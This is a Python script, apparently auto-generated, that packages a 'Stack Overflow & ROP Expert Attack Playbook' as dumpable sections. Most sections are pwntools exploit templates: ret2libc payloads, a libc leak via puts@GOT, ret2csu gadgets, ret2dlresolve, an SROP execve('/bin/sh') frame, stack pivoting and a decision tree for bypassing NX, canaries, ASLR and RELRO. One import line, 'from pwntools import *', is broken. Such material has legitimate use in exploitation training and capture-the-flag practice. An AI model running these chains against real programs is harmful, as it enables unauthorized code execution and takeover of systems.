#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/stack-overflow-and-rop

Skill: SKILL: Stack Overflow & ROP — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-stack-overflow-and-rop.py --help
      python hack-skills-stack-overflow-and-rop.py --list
      python hack-skills-stack-overflow-and-rop.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/stack-overflow-and-rop'
TITLE = 'SKILL: Stack Overflow & ROP — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: stack-overflow-and-rop", "description: >-", "Stack overflow and ROP playbook. Use when exploiting buffer overflows to hijack control flow via return address overwrite, ROP chains, ret2libc, ret2csu, ret2dlresolve, or SROP on Linux userland binaries."],
    'skill-stack-overflow-rop-expert-attack-playbook': [],
    '0-related-routing': ["- [format-string-exploitation](../format-string-exploitation/SKILL.md) \u2014 leak canary/libc/PIE base via format string before triggering overflow", "- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) \u2014 systematic bypass of NX, ASLR, PIE, canary, RELRO", "- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) \u2014 convert a write primitive (GOT, hooks, vtable) into code execution", "- [heap-exploitation](../heap-exploitation/SKILL.md) \u2014 when the vulnerability is in heap rather than stack"],
    'advanced-reference': ["Load [ROP_ADVANCED_TECHNIQUES.md](./ROP_ADVANCED_TECHNIQUES.md) when you need:", "- Blind ROP (BROP) methodology against remote services without binary", "- ret2vdso for ASLR bypass on 32-bit systems", "- Partial overwrite techniques for PIE bypass", "- JOP / COP alternative code-reuse paradigms"],
    '1-stack-layout-fundamentals': ["High Address", "\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510", "\u2502   ...  (caller)     \u2502", "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524", "\u2502   Return Address    \u2502  \u2190 overwrite target (EIP/RIP control)", "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524", "\u2502   Saved EBP/RBP     \u2502  \u2190 overwrite for stack pivoting", "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524", "\u2502   Canary (if enabled)\u2502", "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524", "\u2502   Local Variables    \u2502  \u2190 buffer starts here", "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524", "\u2502   ...               \u2502", "\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518", "Low Address"],
    '2-return-to-libc': ["When NX is enabled (stack not executable), redirect execution to libc functions."],
    'classic-ret2libc-32-bit': ["```python", "payload = b'A' * offset", "payload += p32(system_addr)", "payload += p32(exit_addr)      # fake return address for system()", "payload += p32(binsh_addr)     # arg1: \"/bin/sh\""],
    'ret2libc-64-bit-need-gadgets-for-arguments': ["```python", "pop_rdi = elf_base + 0x401234  # pop rdi; ret", "payload = b'A' * offset", "payload += p64(pop_rdi)", "payload += p64(binsh_addr)", "payload += p64(system_addr)"],
    'libc-base-leak-methods': ["```python"],
    'typical-leak-pattern': ["rop = b'A' * offset", "rop += p64(pop_rdi) + p64(elf.got['puts'])", "rop += p64(elf.plt['puts'])", "rop += p64(main_addr)  # return to main for second payload", "io.sendline(rop)", "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))", "libc_base = leak - libc.symbols['puts']"],
    'one-gadget-single-gadget-rce': ["```bash", "$ one_gadget /path/to/libc.so.6", "0x4f3d5  execve(\"/bin/sh\", rsp+0x40, environ)", "constraints: rsp & 0xf == 0, rcx == NULL", "0x4f432  execve(\"/bin/sh\", rsp+0x40, environ)", "constraints: [rsp+0x40] == NULL", "Constraints must be satisfied \u2014 check register/stack state before using."],
    '3-rop-chain-construction': [],
    'tool-comparison': [],
    'essential-gadget-patterns': ["**x86-64 stack alignment**: `system()` and other libc functions use `movaps` which requires RSP % 16 == 0. Insert an extra `ret` gadget before the call if alignment is off."],
    '4-ret2csu-universal-3-argument-control': ["`__libc_csu_init` exists in nearly all dynamically linked ELF binaries and provides controlled calls with up to 3 arguments.", "```nasm", "; Gadget 1 (csu_init + 0x3a): pop registers", "pop rbx     ; 0", "pop rbp     ; 1", "pop r12     ; call target (function pointer address)", "pop r13     ; arg3 (rdx)", "pop r14     ; arg2 (rsi)", "pop r15     ; arg1 (edi = r15d)", "; Gadget 2 (csu_init + 0x20): controlled call", "mov rdx, r13", "mov rsi, r14", "mov edi, r15d    ; NOTE: only sets edi (32-bit), not full rdi", "call [r12 + rbx*8]", "add rbx, 1", "cmp rbp, rbx", "jne <loop>", "; falls through to gadget 1 again", "**Key constraints**: r12 must point to a **pointer** to the target function (e.g., GOT entry), not the function address directly. Set `rbx=0`, `rbp=1` to skip the loop."],
    '5-ret2dlresolve': ["Forge ELF dynamic linking structures to resolve an arbitrary function (e.g., `system`) without a libc leak."],
    'attack-flow': ["1. Control execution to call `_dl_runtime_resolve(link_map, reloc_offset)`", "2. Forge `Elf_Rel` at known writable address pointing to fake `Elf_Sym`", "3. Forge `Elf_Sym` with `st_name` pointing to fake string `\"system\\x00\"`", "4. Set `reloc_offset` so resolver uses forged structures", "5. Argument (`/bin/sh`) placed on stack or in known buffer", "```python"],
    'pwntools-automation-recommended': ["from pwntools import *", "rop = ROP(elf)", "dlresolve = Ret2dlresolvePayload(elf, symbol=\"system\", args=[\"/bin/sh\"])", "rop.read(0, dlresolve.data_addr)", "rop.ret2dlresolve(dlresolve)", "io.sendline(rop.chain())", "io.sendline(dlresolve.payload)"],
    '32-bit-vs-64-bit-differences': [],
    '6-srop-sigreturn-oriented-programming': ["Abuse the `sigreturn` syscall to set **all registers at once** from a fake Signal Frame on the stack.", "```python", "from pwn import *", "frame = SigreturnFrame()", "frame.rax = constants.SYS_execve  # 59", "frame.rdi = binsh_addr", "frame.rsi = 0", "frame.rdx = 0", "frame.rip = syscall_ret_addr", "frame.rsp = new_stack_addr  # optional pivot", "payload = b'A' * offset", "payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15", "payload += p64(syscall_ret)", "payload += bytes(frame)", "**When to use**: limited gadgets, no `pop rdx`, static binary, or need to pivot stack to arbitrary address."],
    '7-stack-pivoting': ["Move the stack pointer to an attacker-controlled buffer when overflow length is limited."],
    'leave-ret-pivot-pattern': ["Overflow: [AAAA...][fake_rbp \u2192 buf][leave_ret_addr]", "1st leave: rsp = rbp \u2192 fake_rbp;  pop rbp \u2192 *fake_rbp", "1st ret:   rip = leave_ret_addr", "2nd leave: rsp = new_rbp \u2192 buf+8; pop rbp \u2192 *(buf)", "2nd ret:   rip = *(buf+8) \u2192 start of ROP chain in buf"],
    '8-canary-bypass': [],
    '9-tools-quick-reference': ["```bash", "checksec ./binary                          # Show protections (NX, canary, PIE, RELRO)", "ROPgadget --binary ./binary --ropchain     # Auto-generate ROP chain", "ropper -f ./binary --search \"pop rdi\"      # Semantic gadget search", "one_gadget ./libc.so.6                     # Find one-shot RCE gadgets", "pwn template ./binary --host x --port y    # Generate pwntools exploit skeleton"],
    '10-decision-tree': ["Binary has stack overflow?", "\u251c\u2500\u2500 checksec: NX disabled?", "\u2502   \u2514\u2500\u2500 YES \u2192 shellcode on stack, ret to buffer (ret2shellcode)", "\u2502   \u2514\u2500\u2500 NO (NX enabled) \u2192", "\u2502       \u251c\u2500\u2500 Canary enabled?", "\u2502       \u2502   \u251c\u2500\u2500 YES \u2192 fork() server? \u2192 brute-force canary", "\u2502       \u2502   \u2502         format string? \u2192 leak canary", "\u2502       \u2502   \u2502         info leak?     \u2192 read canary", "\u2502       \u2502   \u2514\u2500\u2500 NO \u2192 proceed to ROP", "\u2502       \u251c\u2500\u2500 ASLR/PIE enabled?", "\u2502       \u2502   \u251c\u2500\u2500 PIE \u2192 leak code base (partial overwrite last 12 bits, or info leak)", "\u2502       \u2502   \u251c\u2500\u2500 ASLR only \u2192 leak libc base (puts@GOT, write@GOT)", "\u2502       \u2502   \u2514\u2500\u2500 Neither \u2192 addresses known, direct ROP", "\u2502       \u251c\u2500\u2500 Can leak libc?", "\u2502       \u2502   \u251c\u2500\u2500 YES \u2192 ret2libc (system/execve) or one_gadget", "\u2502       \u2502   \u2514\u2500\u2500 NO \u2192 ret2dlresolve (forge resolution) or SROP", "\u2502       \u251c\u2500\u2500 Need 3+ args but no pop rdx?", "\u2502       \u2502   \u2514\u2500\u2500 ret2csu or SROP", "\u2502       \u251c\u2500\u2500 Overflow too short for full chain?", "\u2502       \u2502   \u2514\u2500\u2500 Stack pivot (leave;ret, xchg rsp)", "\u2502       \u251c\u2500\u2500 Static binary (no libc)?", "\u2502       \u2502   \u2514\u2500\u2500 SROP + syscall chain (execve via sigreturn)", "\u2502       \u2514\u2500\u2500 Full RELRO?", "\u2502           \u2514\u2500\u2500 Cannot overwrite GOT \u2192 target __free_hook, __malloc_hook,", "\u2502               or _IO_FILE vtable (see ../arbitrary-write-to-rce/)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()